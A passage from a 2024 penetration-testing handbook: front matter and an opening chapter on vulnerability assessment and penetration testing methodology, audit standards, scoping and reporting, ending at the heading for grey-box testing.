![](images/cover.jpg)

![Cover](images/cover.jpg)

Copyright © 2024 BPB Online

*All rights reserved.* No part of this book may be reproduced, stored in a retrieval system, or transmitted in any form or by any means, without the prior written permission of the publisher, except in the case of brief quotations embedded in critical articles or reviews.

Every effort has been made in the preparation of this book to ensure the accuracy of the information presented. However, the information contained in this book is sold without warranty, either express or implied. Neither the author, nor BPB Online or its dealers and distributors, will be held liable for any damages caused or alleged to have been caused directly or indirectly by this book.

BPB Online has endeavored to provide trademark information about all of the companies and products mentioned in this book by the appropriate use of capitals. However, BPB Online cannot guarantee the accuracy of this information.

First published: 2024

Published by BPB Online

WeWork

119 Marylebone Road

London NW1 5PU

**UK | UAE | INDIA | SINGAPORE**

ISBN 978-93-55519-511

[www.bpbonline.com](https://www.bpbonline.com)

**Dedicated to**

My cherished mother and father
**Dhanni Devi** and **Ratan Lal Meel**
&
Respected big brother and sister-in-law
**Vijendra Singh Meel** and **Anita**

# About the Author

Ummed Meel is a highly accomplished professional in the field of Cyber Security, boasting over a decade of expertise. He has played pivotal roles in numerous projects, emerging as a leader and a security practitioner. Ummed holds distinguished certifications such as Certified Information Systems Auditor (CISA), Certified Ethical Hacker (CEH), and Certified Computer Hacking and Forensics Investigator (CHFI), along with a Diploma in Cyber Law (DCL). With a remarkable track record, Ummed has conducted an impressive 150+ training sessions and workshops, honing his skills in cyber security, ethical hacking, intelligence, digital forensics, and cybercrime investigation. He has also excelled in establishing cyber security practices, contributing to multiple organizations. His audience spans state police departments across the country and prestigious organizations including the India Air Force, BSF, CISF, CAG, BPRD, CDTI, and various Ministries.

Ummed has accumulated extensive expertise, spanning both hands-on and managerial positions in various domains, such as Red Teaming, Vulnerability Assessment, Penetration Testing, Cyber Security Audits, Compliance, Gap Assessment, and Cyber Advisory. His vast experience extends across a multitude of sectors, encompassing telecommunications, manufacturing, logistics, hospitality, banking, fintech, power supply, stock exchange, aviation, and more.

Additionally, Ummed has made significant contributions by publishing articles in renowned global magazines and journals. He has shared his expert insights through interviews with numerous news channels and newspapers, shedding light on cyber-related solutions. Moreover, he has imparted knowledge through over a hundred seminars and lectures, actively raising awareness about cybercrime in educational institutions. His remarkable involvement extends to aiding investigating agencies in successfully resolving approximately 200 major cybercrime cases within the country. Ummed’s academic qualifications include a B Tech (Hons) degree, LLB (Cyber Law), and ongoing pursuit of an M Tech in Cyber Security from BITS Pilani.

# About the Reviewer

Darryn Brownfield is a penetration tester and bug bounty hunter with over 10 years of experience in the IT industry. He holds industry-recognized and respected certifications such as the OSCP, PNPT, CRT, and CRTP. He publishes CTF write-ups, bug bounty findings, certification reviews across his social media and YouTube.

# Acknowledgement

I am deeply grateful to my family and friends for their unwavering support in creating this book, especially my parents, Dhanni Devi and Ratan Lal Meel. Heartfelt thanks to my inspiration, elder brother Vijendra Singh Meel, and Sister-in-law Anita, for their continuous encouragement, even during late-night writing. Special thanks to my sister Babita Meel and brother-in-law S.I. Ram Swaroop for their remarkable assistance.

I am thankful to BPB Publications for their guidance in bringing this book to life. Refining this work was a journey with reviewers, technical experts, and editors, each contributing valuably.

With profound gratitude, I extend my appreciation to the mentors, supervisors, colleagues, and fellow professionals in the Information Security sector, whose guidance has significantly enriched my understanding. I am fortunate to have received the blessings of my family members, Ramkaran Meel, Phool Chand Choudhary, and Dr. Sanju Choudhary. Additionally, I wish to express my heartfelt thanks to my younger brother, Brijendra Khyalia, for his invaluable technical advices.

To the trio of kid-mischief extraordinaires—Love, Kush, and Hridyansh—applause for turning my writing space into a lively haven.

Lastly, heartfelt thanks to readers for embracing my book. Your encouragement is priceless.

# Preface

In crafting this book, our intention is to provide readers with a comprehensive guide to the dynamic realm of Vulnerability Assessment and Penetration Testing (VAPT). Our purpose is twofold: to educate and empower. We aspire to equip a diverse readership, spanning from novices to seasoned IT professionals, with the knowledge and practical skills required to navigate the ever-evolving landscape of cybersecurity.

The scope of this book is ambitious yet focused. It delves deep into the intricacies of VAPT, from its foundational principles to advanced techniques. We explore VAPT project planning, governance, and the critical PPT (People, Process, and Technology) framework, offering a holistic understanding of this vital practice. Additionally, we elucidate the significance of pre-engagement strategies and the imperative of choosing appropriate security assessments.

Our hands-on approach guides readers in setting up a VAPT test lab, mastering reconnaissance, VA, and exploring practical network pentesting, web application exploitation, wireless network testing, privilege escalation, bypassing security controls, and report writing. It aims to ignite curiosity, foster skills, and equip readers for cybersecurity, making safeguarding digital assets a shared mission where theory meets practice.

[Chapter 1: Beginning with Advanced Pen Testing](#ch01.xhtml) – This chapter introduces readers to advanced penetration testing and its vital role in modern cybersecurity. It covers the core principles of VAPT, emphasizing the People, Process, and Technology (PPT) framework. Pre-engagement techniques for understanding client requirements and choosing appropriate security assessments are also discussed. This chapter sets the stage for a comprehensive exploration of advanced penetration testing techniques and principles in the subsequent chapters.

[Chapter 2: Setting up the VAPT Lab](#ch02.xhtml) – This chapter delves into the creation of an advanced VAPT test lab using open-source tools. Discover how to interconnect various computer systems and network devices, simulating real-world scenarios while maintaining security measures. The VAPT lab serves as a crucial environment for skill development, risk-free experimentation, and strategy formulation for cybersecurity professionals, emphasizing its pivotal role in the field.

[Chapter 3: Active and Passive Reconnaissance Tactics](#ch03.xhtml) – This chapter delves into the crucial role of reconnaissance tactics in successful penetration testing. Learn how to gather essential information about your target, adapting your approach to various components of a computer system and the unique characteristics of the target organization. Explore the treasure trove of data available on the internet and discover the power of Open Source Intelligence (OSINT) in collecting vital information from public sources, including email addresses, domain names, IP addresses, employee details, hostnames, and DNS records.

[Chapter 4: Vulnerability Assessment and Management](#ch04.xhtml) – This chapter delves into the realm of Vulnerability Assessment (VA) and its intricacies. Our primary aim is to empower penetration testers and security experts with invaluable knowledge in both manual and automated VA methodologies. By the chapter’s end, you will have a comprehensive understanding of various VA techniques and best practices, enabling you to identify and address vulnerabilities across diverse computer infrastructures. Additionally, we explore the pivotal role of precise and targeted patch management in optimizing the overall effectiveness of VA initiatives.

[Chapter 5: Exploiting Computer Network](#ch05.xhtml) – This chapter delves deep into the practical realm of network penetration testing by actively exploiting vulnerabilities discovered in previous sections. Exploitation serves a critical role in assessing the true gravity of vulnerabilities and their potential consequences for the target environment. We emphasize the significance of gathering intelligence about the target environment before choosing a specific attack vector. Using open-source tools and manual scripts within a controlled testing environment, we provide hands-on experience that simulates real-world scenarios. Throughout this chapter, you will gain valuable insights into the operational aspects of exploitation tools, including Metasploit and Armitage.

[Chapter 6: Exploiting Web Application](#ch06.xhtml) – This chapter provides a comprehensive introduction to web application exploitation, essential in today’s digital landscape. It covers both fundamental and advanced vulnerability exploits, elucidating common attack vectors, threat modeling, and the identification of technical and business logic flows in web applications. By the chapter’s end, readers will possess a thorough understanding of advanced web application exploitation techniques and the expertise to conduct sophisticated assessments.

[Chapter 7: Exploiting Wireless Network](#ch07.xhtml) – This chapter presents a comprehensive exploration of wireless network pentesting, targeting diverse networks like Wi-Fi and Bluetooth. Its primary focus is on revealing vulnerabilities and potential threats within these networks while establishing effective countermeasures to enhance security.

[Chapter 8: Hash Cracking and Post Exploitation](#ch08.xhtml) – This chapter takes you on an engaging journey into privilege escalation and network pivoting. It explores cutting-edge tools and techniques for password and hash cracking, as well as post-exploitation procedures. By the end, you will gain a comprehensive understanding of advanced penetration testing techniques to uncover vulnerabilities and enhance security measures with precision and expertise.

[Chapter 9: Bypass Security Controls](#ch09.xhtml) – This chapter delves into the art of bypassing security controls within computer networks, covering Windows security controls, antivirus measures, and firewall protections. It also explores social engineering and miscellaneous penetration testing techniques, offering valuable insights and skills to assess and enhance the efficacy of security controls in computer networks.

[Chapter 10: Revolutionary Approaches to Report Writing](#ch10.xhtml) – This chapter delves into the art of report writing, a crucial aspect of the industry. Assessments are incomplete without well-crafted reports that meet required standards. It provides insights through detailed reports, covering technical and logical vulnerabilities, along with recommendations. This chapter also offers guidance on calculating CVSS scores, assessing risk, prioritizing risks, and classifying severity. Additionally, it explores creating impactful presentations and security dashboards to effectively communicate assessment findings.

# Coloured Images

Please follow the link to download the

***Coloured Images*** of the book:

[https://rebrand.ly/j6c2hib](https://rebrand.ly/j6c2hib)

We have code bundles from our rich catalogue of books and videos available at [**https://github.com/bpbpublications**](https://github.com/bpbpublications). Check them out!

Errata

We take immense pride in our work at BPB Publications and follow best practices to ensure the accuracy of our content to provide with an indulging reading experience to our subscribers. Our readers are our mirrors, and we use their inputs to reflect and improve upon human errors, if any, that may have occurred during the publishing processes involved. To let us maintain the quality and help us reach out to any readers who might be having difficulties due to any unforeseen errors, please write to us at :

**[errata@bpbonline.com](mailto:errata@bpbonline.com)**

Your support, suggestions and feedbacks are highly appreciated by the BPB Publications’ Family.

**Join our book’s Discord space**

Join the book’s Discord Workspace for Latest updates, Offers, Tech happenings around the world, New Release and Sessions with the Authors:

**[https://discord.bpbonline.com](https://discord.bpbonline.com)**

![](images/fm1.png)

# [CHAPTER 1Beginning with Advanced Pen Testing](#contents.xhtml_ch01a)

[Introduction](#contents.xhtml_sc2_1a)

Penetration Testing (PT) is a legally authorized practice that aims to identify technical and logical flaws within computer systems, as well as to evaluate an organization’s security controls, monitoring capabilities, and incident response procedures. As technology continues to advance, the complexity of attack surfaces increases, making Vulnerability Assessment and Penetration Testing (VAPT) a crucial and well-established method for mitigating potential threats. By providing insight into an organization’s security posture and accurate remediation solutions, VAPT can safeguard businesses from data breaches and unauthorized access.

Today, adopting zero trust policies has become a crucial component of organizational security, and VAPT is no exception. It plays an important role in ensuring proper validation of inputs received from applications and devices.

This chapter covers the fundamental principles of VAPT project planning, management, and governance. It also delves into the People, Process, and Technology (PPT) framework, which helps to clarify the role of individuals, processes, and technology in VAPT practice. The chapter further explores VAPT methodology and approach in detail, equipping Pen testers with an industry-oriented understanding of the practice. With this understanding and an agile approach, Pen testers can execute enterprise-level testing practices smoothly and efficiently.

Before beginning a project, pre-engagement techniques can help auditing organizations to clearly understand the scope and requirements of their clients and accordingly, enlist the necessary toolsets, manpower, and deliverables. Additionally, to choose the most appropriate security assessments for your organization, you must be well-versed in the cybersecurity offerings available in the market and understand the differences between them.

| Note: Regular vulnerability assessments and penetration testing are essential exercises for identifying, prioritizing, reporting, and remediating weak security practices, threats, and vulnerabilities in your computer infrastructure. By performing these exercises on a regular basis, organizations can proactively mitigate potential threats and safeguard their systems against malicious attacks. |

[Structure](#contents.xhtml_sc2_2a)

In this chapter, we will discuss the following topics:

*   Fundamentals of VAPT

*   Advanced penetration testing techniques and strategies

*   Business and compliance requirements for VAPT

*   Industrial approach and methodology in VAPT

*   Security audit standards and frameworks: Best practices

*   Pre-engagement interaction with customers

*   Designing the Scope of Work for security audits

*   Project planning and governance in VAPT

*   Delivery and customer success tactics in VAPT

[Objectives](#contents.xhtml_sc2_3a)

The primary aim of this chapter is to provide cyber security professionals and organizations with an in-depth understanding of advanced VAPT approaches and methods. By reading this chapter, you will learn not only about the VAPT approach but also about its standards, frameworks, scope designing, customer engagement, project management, governance, and customer success strategies.

Advanced VAPT approaches and methods can effectively identify and prioritize vulnerabilities based on their severity, enabling organizations to focus their efforts on addressing the most critical vulnerabilities. This approach can enhance the overall efficiency of the VAPT process and lead to more successful outcomes. This chapter is also beneficial for individuals and organizations seeking to understand why they need VAPT services, as well as which services would be most beneficial to their business based on relevant regulatory or industry standards.

[Fundamentals of VAPT](#contents.xhtml_sc2_4a)

Vulnerability Assessment and Penetration Testing (VAPT) is a methodical and risk-based approach for identifying security vulnerabilities within computer infrastructure. VAPT audits utilize a combination of automated tools and manual efforts to detect all potential vulnerabilities that malicious actors may exploit.

The vulnerability life cycle refers to a vulnerability’s stages, from its discovery to its resolution. [Figure 1.1](#ch01.xhtml_fig1-1) provides a visual representation of this process:

![](images/Figure_1.1.png)

Figure 1.1: Vulnerability Life Cycle

[Vulnerability Assessment](#contents.xhtml_sc3_5a)

Vulnerability Assessment (VA) can only detect weaknesses in the targeted system. However, it cannot differentiate between findings that have the potential to be exploited and cause damage to the system.

[Penetration Testing](#contents.xhtml_sc3_6a)

Penetration Testing (PT) is a sequential exercise that builds on vulnerability assessment results. In this process, the pen tester identifies vulnerabilities and exploits them to gain access and exfiltrate data. Additionally, penetration testing evaluates the system through the access gained after exploitation to determine the sensitivity of the accessible data.

For example, if banner grabbing identifies an outdated version of a service and the pen tester has included all relevant CVEs/CWEs in their report, that would be classified as a vulnerability assessment. However, if the pen tester is able to gain access to the server or obtain a desired response through the use of an exploit, then this would fall under the category of Penetration Testing.

| Note: A pen tester should not be content with identifying only the obvious vulnerabilities and then stop working. Given the ever-increasing complexity of attack surfaces, a great deal of effort is required to thoroughly test and secure systems against potential threats. |

[Advanced penetration testing techniques and strategies](#contents.xhtml_sc2_7a)

A decade ago, when organizations did not prioritize cyber security, basic technical knowledge was enough to conduct a vulnerability assessment scan using automated tools. However, this approach can now only identify known and technical vulnerabilities. As technology and VAPT methodology have evolved, modernization is crucial. For instance, the attack payload must be advanced and Fully Undetectable (FUD) to bypass security controls effectively. It is essential to have objective-oriented testing approaches that define why a network firewall or web application firewall needs to be bypassed during the audit. Advanced VAPT approaches use more sophisticated tools and techniques to detect and exploit vulnerabilities, offering numerous benefits, as shown in [Figure 1.2](#ch01.xhtml_fig1-2).

![](images/Figure_1.2.png)

Figure 1.2: Advanced approach for VAPT

To ensure timely and comprehensive detection of all vulnerabilities, your risk-based approach must be both agile and advanced. Advanced penetration testing can help you not only detect vulnerabilities but also identify the most effective security controls for your computer infrastructure. Pen testers must possess a comprehensive understanding and skill set to accurately audit key sensitive areas of the business.

The traditional VAPT phase of asset discovery, which was once considered the most essential, has evolved into attack surface management. This is a well-planned approach to continuously discovering, inventorying, tagging, and monitoring the status of IT assets in an organization’s infrastructure. The attack surface is constantly changing and is a critical consideration for organizations of all sizes. By implementing effective attack surface management practices, both system owners and CISOs can gain visibility into their organization’s IT infrastructure.

| Note: In some cases, vulnerabilities in a system’s business logic flow can result in a greater impact than technical vulnerabilities, as these types of vulnerabilities may require less technical expertise and a smaller toolset to exploit. |

[Business and compliance requirements for VAPT](#contents.xhtml_sc2_8a)

Today, conducting VAPT exercises has become crucial for all enterprises, and it is being adopted as a regular practice to ensure data security. VAPT is a practical and proven approach that helps businesses identify, analyze, prioritize, and mitigate risks. Vulnerabilities can exist anywhere, such as in software, hardware, or communications, but an intensive testing approach takes a deep dive and can fix vulnerabilities even before they are exploited by hackers. Each business requires a comprehensive assessment of its entire attack surface to ensure the safety of its Information Communication Technology (ICT) from both known and unknown threats.

| Note: Every application should exercise caution when handling user input, ensuring that all inputs are properly sanitized and stored only if they adhere to the approved format. |

The ease of access to data and applications is often a top priority for businesses, but security compliance requirements can create challenges. These requirements can conflict with business needs, and it can be difficult to find a balance between the two. Regular VAPT audits are necessary to identify and address vulnerabilities and ensure compliance. Risk acceptance and monitoring are critical to detecting and responding to cyber-attacks that target security controls and endpoints.

The scope of a VAPT exercise should encompass a wide range of assets, including networks, websites, software, wireless networks, mobile applications, APIs, containers, cloud-based services, social platforms, and security devices. In some cases, physical penetration testing may also be necessary to simulate real-world threats and create a robust security ecosystem within the organization.

VAPT provides immense benefits to an organization, such as :

*   Offers comprehensive visibility into the organization’s IT infrastructure

*   Assists in mapping and managing the attack surface

*   Improves overall security posture of the organization

*   Facilitates the creation of threat models based on the business context

*   Identifies and addresses vulnerabilities

*   Enables risk management and implementation of security measures

*   Assists in selecting the appropriate set of secure practices and security controls

*   Aids in designing a secure architecture and implementing relevant controls

| Note: The VAPT audit reports must be submitted to compliance and regulatory bodies, making it crucial that they contain comprehensive and well-organized information to effectively conclude the audit. |

[Industrial approach and methodology in VAPT](#contents.xhtml_sc2_9a)

While academia has its merits, the industry-oriented approach and methodology surpass it due to its incorporation of on-the-ground challenges. Thanks to advancements in automation, auditing companies can now easily create a customized approach and methodology for any project with just a few key details.

The following phases are typically included in this approach and methodology:

![](images/Figure_1.3.png)

Figure 1.3: Industrial approach and methodology for VAPT

[Goals and objectives](#contents.xhtml_sc3_10a)

To establish a successful VAPT practice, the auditee organization must define its goals and objectives clearly. This involves engaging relevant stakeholders such as developers, caretakers, custodians, and infrastructure owners in the goal-setting process. The exercise goals should also outline the specific reason for conducting the VAPT and the expected output to comply with regulatory guidelines and meet business requirements. The desired objectives cannot be achieved without aligning the security practice with the business requirements.

[Kickoff call](#contents.xhtml_sc3_11a)

The kickoff meeting is an essential gathering between the auditing and auditee teams, including spokespersons and project managers from both sides. It serves as an opportunity to discuss prerequisites project planning, and introduce team members. If required, both teams should also discuss obtaining necessary consent and legal clearances from relevant authorities. During this meeting, the delivery plan, methods, materials, and expected time frame may also be decided.

A RACI matrix (also known as a Responsibility Assignment Matrix or RACI chart) is a valuable tool used to define and document the roles and responsibilities of individuals or teams in a project or process. It effectively communicates who is accountable for completing each task or decision within the project. This fact is further emphasized by the escalation matrix, which comes into play if the directly responsible person is unresponsive or not performing well. In such cases, the escalation matrix triggers the issue to be taken to the next level for resolution.

[Intelligence gathering](#contents.xhtml_sc3_12a)

It involves conducting reconnaissance against targets to gather as much information as possible, which is then utilized for Vulnerability Assessment and Exploitation. This wealth of information enables the accurate design, development, and execution of additional attack vectors. Intelligence can be divided into two main parts:

[Passive intelligence](#contents.xhtml_sc4_13a)

Passive intelligence involves gathering information without the target being aware of any intelligence-gathering activity. It relies on publicly available sources such as search engines, social media platforms, job sites, web archives, data leaks, and dark web forums. These sources are utilized to collect intelligence without any direct connection or interaction between the Pen tester and the target. However, this approach may also include some false positive intelligence due to its connectionless nature.

[Active intelligence](#contents.xhtml_sc4_14a)

It is a proactive approach where the Pen tester directly engages with the target to gather more precise information. Active intelligence involves collecting crucial data, such as technology, framework, DNS enumeration, ports, services, OS fingerprinting, subdomains, directories, pages, security controls, and more. However, this should only be carried out after obtaining legal and managerial approval from the concerned authorities.

[Threat modeling](#contents.xhtml_sc3_15a)

Threat modeling is a systematic process that aids in identifying and enumerating potential threats, such as architectural defects and inadequate security controls. The selection and implementation of countermeasures depend on the potential damage the threats can cause and the cost of control. Through threat modeling, essential questions like “What are the most relevant threats to your business?”, “What security controls are missing or ineffective?” and “What actions are needed to safeguard against these threats?” are answered.

Benefits of cyber threat modeling include:

*   Discovery, prioritization, and reduction of threats

*   Facilitation of rational decision-making

*   Reduction of the attack surface

*   Selection and implementation of economical and necessary security controls

*   Improvement of the organization’s security posture

| Note: Whenever the Pen tester identifies the absence of adequate security controls, it should be documented in the report, along with an appropriate recommendation. |

[Vulnerability assessment](#contents.xhtml_sc3_16a)

Vulnerability assessment is a process where the Pen tester endeavors to discover logical and technical flaws in applications and computer networks. For instance, in a network VA scan, the Pen tester first identifies the operating system, open ports, and running services. Checking the service version is essential to determine whether the running version is vulnerable or up to date. A comprehensive evaluation involves multilevel correlation before listing any weaknesses.

There are two distinct approaches to conducting a vulnerability assessment: automatic and manual.

[Automated VA scan](#contents.xhtml_sc4_17a)

Automated scanning tools, like Nessus, Nexpose, and OpenVAS, analyze responses by comparing received data or parameters with a vulnerability database. When predetermined conditions match, the scanning tool identifies and lists vulnerabilities. Leveraging automated scanning allows organizations to streamline vulnerability detection, minimizing time, effort, and associated costs.

[Manual VA scan](#contents.xhtml_sc4_18a)

On the other hand, manual evaluation can unveil vulnerabilities that may go undetected by any automated tool. However, the manual approach also has its drawbacks, such as requiring additional effort, time, and cost.

[Penetration testing](#contents.xhtml_sc3_19a)

Penetration testing follows VA, wherein the Pen tester attempts to exploit vulnerabilities identified in the initial scan. The exploit is designed to prompt the target server to perform an unauthorized act and deliver the desired output. By exploiting vulnerable running services, various actions like data dump, interruption, and reverse connection can be executed.

While many tools with extensive databases exploit known technical vulnerabilities, the manual approach remains the best and most accurate way to exploit business logic flows or logical weaknesses. Some organizations prefer conducting penetration testing in production to assess the effectiveness of their security controls as well.

| Note: It is imperative to exercise utmost caution when executing memory and DOS-based exploits during penetration testing in production environments. Following industry best practices, it is advisable to exclusively employ auxiliaries in these situations while refraining from direct exploit execution. |

[Post exploitation](#contents.xhtml_sc3_20a)

The primary objective of this exercise is to assess the compromised asset’s value and establish persistence for long-term use. Asset valuation is essential for determining the sensitivity of the accessed data on the compromised system.

Gaining intelligence about the compromised servers, including configuration, communication, and relationships with other systems in the network, is beneficial for executing lateral movements. Comprehensive post-exploitation testing also evaluates the effectiveness of authorization controls within the target asset or organization. While the attack method may vary slightly depending on the target’s nature, the ultimate objective remains straightforward: elevate the current privilege level to the next or root level.

| Note: Given your current network access, it is crucial to secure the auditee organization's authorization before proceeding with any privilege escalation or network pivoting activities. |

[Reporting](#contents.xhtml_sc3_21a)

The reporting phase is the most valuable and crucial aspect of the entire VAPT exercise. It should be easily comprehensible and enriched with essential information. A streamlined report structure aids stakeholders in selecting the right information for effective patching.

The Pen tester utilizes the Common Vulnerability Scoring System (CVSS) score to determine the severity of the findings. To simplify work and enhance comprehensiveness, all endpoints affected by the same vulnerability should be included in a single instance in the report. Moreover, the audit report must encompass all the information for IS, compliance, and regulatory audits. Three preferred types of reporting are Security Posture - executive summary, Vulnerability Management Tracker, and Detailed Technical Reports.

[Security posture: Executive summary](#contents.xhtml_sc4_22a)

Designed specifically for CISOs, this high-level document presents the organization’s current and historical security status. Due to the VAPT exercise’s diverse line items and the complexity of the report, an integrated approach is essential, accomplished through a security posture or executive report. This decision-making document aids in selecting the appropriate security controls while eliminating unnecessary ones to optimize costs.

[Detailed technical report](#contents.xhtml_sc4_23a)

In this section, we will present the technical deliverables that were agreed upon during the proposal discussion. The technical report will encompass essential information, including vulnerability names, descriptions, affected endpoints, CVSS scores, severity levels, CVE and CWE identifiers, proof of concept, steps to reproduce, impact assessment, mitigation strategies, and references. Crucially, the report must include a proof of concept (POC) to demonstrate evidence of compromise and accurately define the sensitivity of the data.

[Vulnerability management tracker](#contents.xhtml_sc4_24a)

The Vulnerability tracker serves as an intermediary document between the Auditing (pentester) and the auditee team, enabling effective real-time findings management. This tool allows easy tracking of the current status of critical or priority vulnerabilities, whether they are fixed, open, or in progress. While automated ticket management solutions are available in the market, shared Excel sheets can also manage vulnerabilities effectively.

[Security audit standards and frameworks: Best practices](#contents.xhtml_sc2_25a)

To enhance the tangibility, smoothness, and effectiveness of the VAPT exercise, various standards and frameworks are employed. Adhering to these standards and frameworks is crucial to ensure that assessment reports are acceptable in any information security and compliance audit. Security communities usually develop and overseen these standards, gaining global acceptance.

Here are some renowned standards and frameworks that we can utilize:

[Open web application security project standard](#contents.xhtml_sc3_26a)

Open Web Application Security Project (OWASP) is an online community led by the OWASP Foundation, dedicated to providing freely-available articles, methodologies, documents, tools, and technologies in the application security field. Mark Curphey initiated OWASP on September 9, 2001; the first “Top Ten” list was published in 2003. Regular updates are conducted every four years, guided by trending security risks experienced by over 40 partner organizations.

The primary objective of OWASP is to identify the top ten cyber threats related to applications, offering an evaluation checklist and suggesting best practices for secure development. Additionally, OWASP has intentionally developed several insecure web applications, like WebGoat, designed to help students explore vulnerabilities and cultivate secure coding habits.

[CWE/SANS Top 25](#contents.xhtml_sc3_27a)

The SysAdmin, Audit, Network, and Security (SANS) Institute is a private U.S. for-profit company established in 1989 and stands as one of the world’s largest cyber security research and training institutes.

The CWE/SANS top 25 list highlights the most significant and widely occurring software vulnerabilities that are both easily discoverable and exploitable. These weaknesses provide hackers with opportunities to engage in malicious activities such as hacking, data theft, spoofing, backdoor creation, DDoS attacks, and total system takeover. The top 25 vulnerabilities of CWE/SANS have been curated through multiple surveys, trend observations, and personal interviews with DevSecOps and security practitioners.

[Penetration Testing Execution Standard](#contents.xhtml_sc3_28a)

The Penetration Testing Execution Standard (PTES) comprises seven main steps, enabling Pen testers to conduct exercises systematically, precisely, and effectively. It supports the entire process, from initial communication to final delivery or detailed reporting, encompassing pre-engagement, intelligence gathering, threat modeling, vulnerability assessment, exploitation, post-exploitation, and reporting. PTES standardizes penetration testing practices on such a wide scale that the traditional approach to application, API, network, and wireless testing becomes akin to a full-red team engagement.

[Open-source security testing methodology manual](#contents.xhtml_sc3_29a)

The project is maintained by the Institute for Security and Open Methodologies (ISECOM) and has been developed in an open community with valuable contributions from numerous global companies. OSSTMM offers an advanced and thorough methodology for security assessment, void of assumptions and anecdotal evidence. It has earned a reputation as a renowned method for accurately measuring cyber security at an operational level.

OSSTMM allows any security practitioner to contribute ideas, ensuring continuous improvement to make the method more accurate, realistic, actionable, and efficient. The focus of this manual is on OpSec tests across all operational channels, encompassing human, physical, wireless, telecommunications, and data networks.

The guidelines aim to ensure the following:

*   The test was conducted thoroughly.

*   All necessary channels were included in the test.

*   The posture for the test complied with the law.

*   The results are measurable in a quantifiable manner.

*   The results are consistent and repeatable.

*   The results contain only facts derived directly from the tests themselves.

[NIST Cybersecurity Framework](#contents.xhtml_sc3_30a)

The NIST Cyber Security Framework, designed and published by the US National Institute of Standards and Technology (NIST), serves as a valuable resource for individuals, businesses, and organizations to assess cyber risks that could impact their operations. It is widely recognized and accepted globally, a popular best practice for critical infrastructure cyber security.

Organized into five functions and further subdivided into 23 categories, the NIST Cybersecurity Framework presents a comprehensive approach. Each category defines numerous subcategories of cybersecurity outcomes and security controls, amounting to 108 subcategories in total. The framework not only identifies and prioritizes risks but also aligns policy, business, and technical approaches for efficient risk mitigation management.

The five functions of the NIST Cyber Security Framework are as follows:

*   Identify

*   Protect

*   Detect

*   Respond

*   Recover

[ISO 27001 standards](#contents.xhtml_sc3_31a)

ISO/IEC 27001 is an international standard that assists organizations in establishing, implementing, maintaining, and continuously improving an Information Security Management System (ISMS). Successful implementation of this standard ensures robust protection for critical computer infrastructure against technical and human threats.

Organizations meeting the standard requirements may also achieve certification by an accredited body upon successful completion of the audit. ISO 27001 guides systematic examination of an organization’s attack surface against threats and vulnerabilities, evaluating the effectiveness of implemented security controls. It also facilitates the design and implementation of a comprehensive suite of information security controls for risk mitigation.

ISO/IEC 27001:2013 comprises ten concise clauses:

*   Scope of the standard

*   Document referencing

*   Reuse of terms and definitions from ISO/IEC 27000

*   Organizational context and stakeholders

*   Information security leadership and high-level policy support

*   Planning an information security management system, risk assessment, and risk treatment

*   Supporting an information security management system

*   Making an information security management system operational

*   Reviewing the system’s performance

*   Corrective action

[CIS benchmarks](#contents.xhtml_sc3_32a)

The Center for Internet Security (CIS) is a U.S.-based non-profit organization founded in October 2000\. Its mission is to promote timely best-practice solutions and controls to safeguard individuals, businesses, and governments from widespread cyber threats targeting Critical Information Infrastructure (CII).

CIS collaborates with numerous corporations, government agencies, and educational institutions to identify and refine effective security measures. One crucial aspect is CIS benchmarking, which plays a pivotal role in formulating security policies and procedures to ensure robust information access control. The CIS benchmark comprises 18 priority security measures designed to mitigate the most prevalent cyber-attacks on CII. All specified control documents are readily available for download from the official CIS website.

[ISACA standards and guidelines](#contents.xhtml_sc3_33a)

Established in the United States in 1994, Information Systems Audit and Control Association ISACA is an international professional association primarily focused on IT governance. Currently, ISACA offers 8+ certification programs along with other micro-certificates, serving over 140,000 constituents in 180+ countries.

ISACA plays a vital role in assisting organizations and auditors to conduct comprehensive audits and implement IS auditing standards. These standards are dedicated to meeting mandatory requirements for IS auditing and reporting, ensuring auditors maintain a minimum level of performance.

[MITRE framework](#contents.xhtml_sc3_34a)

The MITRE ATT&CK framework serves as a knowledge base and research program to monitor adversary behavior throughout the attack lifecycle. It is designed based on Tactics, Techniques, and Procedures (TTPs). Currently, there are a total of 14 known tactics that encompass numerous techniques and procedures.

This framework proves invaluable in conducting thorough analyses of alerts in Security Operations Centers (SOC) triggered by various attack vectors captured by MITRE. Additionally, it aids in the collection and analysis of threat intelligence. By leveraging the MITRE ATT&CK framework, organizations can create a more secure and self-sufficient architecture.

[Pre-engagement interaction with customers](#contents.xhtml_sc2_35a)

The pre-engagement phase serves as the primary step in the VAPT project, during which the auditing organization presents its offerings, capabilities, methodologies, and deliverables. Simultaneously, it allows the auditee organization to gain a comprehensive understanding of the offerings and compare them with those of other market players to select the most suitable services. This discussion usually takes place in several stages and may involve agreements and disagreements on various service aspects. Nevertheless, both parties must ultimately finalize the service and delivery models.

The pre-engagement discussion should cover the following aspects:

[Define audit scope](#contents.xhtml_sc3_36a)

Defining the scope is the most critical and challenging step of the entire exercise because the audit must stay within the agreed area. Transparency in the scope benefits the Pen tester in various ways, including identifying attack surfaces, strategizing audits, selecting the right tools and resources, setting deadlines, and finalizing deliverables.

Neglecting these considerations can lead to severe issues like scope creep, violations of service level agreements, and customer dissatisfaction. It is crucial to document all line items, such as web apps, mobile apps, APIs, cloud, containers, network devices, servers, databases, Operational Technology (OT), Internet of Things (IoT), and thin-clients, clearly and unambiguously. This documentation can serve as evidence in case of disputes between the involved parties.

[Exercise nature](#contents.xhtml_sc3_37a)

The auditee organization has complete freedom to choose the nature of the exercise based on its specific needs and understanding. Both remote and on-site exercises offer distinct advantages and disadvantages. Remote practices may involve complexities in establishing connectivity to the organization’s internal network but come with lower costs for the customer. Conversely, on-site exercises do not face challenges in connectivity but may incur higher charges due to resource travel and accommodation.

Various other factors can also influence the testing nature selection, such as test quality, connectivity channel bandwidth, implemented security controls, patching support, and vulnerability management.

[Testing method](#contents.xhtml_sc3_38a)

Various test methods are available for VAPT, with three being widely used: black box, grey box, and white box. The choice of a specific testing method in a VAPT process depends on the goals, constraints, and vulnerabilities to be identified and addressed. These test methods differ significantly in access level and knowledge of the target, as depicted in [Figure 1.4](#ch01.xhtml_fig1-4):

![](images/Figure_1.4.png)

Figure 1.4: Testing method

[Black box](#contents.xhtml_sc4_39a)

In this approach, the Pen tester will possess only fundamental information about the target, such as the IP address and web URL. This type of assessment is referred to as surface-based VAPT since no login credentials are provided to the Pen tester.

[Grey box](#contents.xhtml_sc4_40a)

